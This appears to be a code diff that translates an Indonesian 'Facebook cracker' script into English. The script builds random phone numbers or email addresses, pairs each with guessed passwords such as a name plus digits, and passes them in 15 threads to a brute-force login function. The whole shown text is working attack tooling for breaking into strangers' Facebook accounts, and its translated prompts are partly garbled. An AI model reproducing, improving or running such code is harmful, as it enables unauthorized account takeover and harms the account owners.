@@ -33,24 +33,24 @@ def random_numbers():
   print('''
   [ FACEBOOK CRACKER RANDOM NUMBERS ]
 
-  Isi nomor awalnya ya kaka
-  Harus 5 digit gak boleh kurang dan gak boleh lebih.
-  Contoh: 62877
+ Fill in the initial number, sis
+  Must be 5 digits or may not be less and may not be more.
+  Example: 62877
   ''')
-  kode=str(input('  Masukan nomor awal: '))
-  exit('  Nomor harus 5 digit ya kaka ga boleh kurang.') if len(kode) < 6 else ''
-  exit('  Nomor harus 5 digit ya kaka ga boleh lebih.') if len(kode) > 6 else ''
-  jml=int(input('''
-  Masukan jumlah nomor yang akan dibuat contoh: 10
-  Jumlah: '''))
-  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
+  code=str(input('  Enter initial number: '))
+  exit('  The number must be 5 digits, so you can't lose it.') if len(code) < 5 else ''
+  exit('  The number must be 5 digits, so not more.') if len(code) > 5 else ''
+  number=int(input('''
+ Enter the number of numbers to make, for example: 10
+  total: '''))
+  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[7:])]}) for e in [str(code)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(number)]]
   print('''
-  Semoga hari ini kaka beruntung :)
-  Tunggu ya kak jgn di tutup....
+  Good luck today :)
+  Wait, bro, don't close it....
   ''')
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
-  print('\n  Sudah selesai kak')
+  print('\n  It's finished bro')
 
 def random_email():
   data = []
@@ -58,46 +58,46 @@ def random_email():
   print('''
   [ FACEBOOK CRACKER RANDOM EMAIL ]
 
-  Isi nama penggunanya ya kaka
-  Contoh: putri
+  Fill in the name of the user, kaka
+  Example: Princess
   ''')
-  nama=input('  Nama pengguna: ')
+  name=input('  Username: ')
   domain=input('''
-  Pilih domainya kak [G]mail, [Y]ahoo, [H]otmail
-  pilih (g,y,h): ''').lower().strip()
+  select domain bro [G]mail, [Y]ahoo, [H]otmail
+  select (g,y,h): ''').lower().strip()
   list={
     'g':'@gmail.com',
     'y':'@yahoo.com',
     'h':'@hotmail.com'
   }
-  exit('  Mohon isi yang bener ya kak.') if not domain in ['g','y','h'] else ''
-  jml=int(input('''
-  Masukan jumlah email yang akan dibuat contoh: 10
-  Jumlah: '''))
+  exit('  Please fill in the correct bro.') if not domain in ['g','y','h'] else ''
+  number=int(input('''
+Enter the number of e-mails to make. Example: 10
+  total: '''))
   setpw=input('''
-  Set password yg mendekati nama pengguna
-  contoh: putri123,putri1234
+  Set a password that approaches the user's name
+  example: princess123, princess1234
   Set password: ''').split(',')
-  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
+  [data.append({'user': name+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,number+1)]
   print('''
-  Semoga hari ini kaka beruntung :)
-  Tunggu ya kak jgn di tutup....
+  Have a good day today :)
+  Wait, sis, don't close it...
   ''')
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
-  print('\n  Sudah selesai kak')
+  print('\n  It's finished bro')
 
-def pilih():
+def select():
   print('''
-  1. Crack dari nomor random
-  2. crack dari email random
+  1. Crack from a random number
+  2. Crack from random emails
   ''')
-  pil=int(input('  Pilih mana man?: '))
+  pil=int(input('  Choose which man?: '))
   if pil == 1:
     random_numbers()
   elif pil == 2:
     random_email()
   else:
-    exit('  Goblokk')
+    exit('  Goback')
  
-pilih() if __name__ == '__main__' else exit('Maaf ada yang error kaka , silahkan coba lagi yahh.')
+select() if __name__ == '__main__' else exit('Sorry, somethings wrong please try again later.')
